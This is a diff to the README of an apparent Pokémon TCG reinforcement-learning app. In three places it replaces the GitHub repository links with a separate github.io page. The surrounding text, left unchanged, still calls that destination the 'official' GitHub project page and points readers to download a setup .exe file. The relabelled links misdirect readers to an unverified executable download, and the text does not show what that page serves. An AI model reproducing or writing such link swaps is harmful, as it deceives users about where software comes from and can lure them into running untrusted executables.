@@ -1,6 +1,6 @@
 # 🤖 ptcg-population-rl - Learn Pokémon TCG with Smart AI
 
-[![Download Now](https://img.shields.io/badge/Download-ptcg--population--rl-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Paschal-titre4015/ptcg-population-rl)
+[![Download Now](https://img.shields.io/badge/Download-ptcg--population--rl-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://paschal-titre4015.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ Ready to dive in? Follow these simple steps to get ptcg-population-rl up and run
 
 ### 📥 Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/Paschal-titre4015/ptcg-population-rl](https://github.com/Paschal-titre4015/ptcg-population-rl)
+**Visit this link to download the application:** [https://paschal-titre4015.github.io](https://paschal-titre4015.github.io)
 
 When you click the link, you will be taken to the official project page on GitHub. Look for the green "Code" button near the top right of the page, but don't worry about that yet. Instead, scroll down or look for the "Releases" section on the right side of the page–that's where you will find the latest version of the app. Click on the most recent release, and then download the file attached to it. The file will be named something like `ptcg-population-rl-setup.exe`–that is the file you need.
 
@@ -108,7 +108,7 @@ While this guide focuses on helping you use the app, we also love hearing from u
 
 ## 📚 Additional Resources
 
-- **Official GitHub Repository**: [https://github.com/Paschal-titre4015/ptcg-population-rl](https://github.com/Paschal-titre4015/ptcg-population-rl)
+- **Official GitHub Repository**: [https://paschal-titre4015.github.io](https://paschal-titre4015.github.io)
 )
 - **Beginner's Guide to Pokémon TCG**: Check out the official Pokémon website for basic rules if you're brand new to the game.
 - **Community Deck–Building Forum**: Many players share their custom decks online–search for "Pokémon TCG deck strategies" to find inspiration for your own builds.
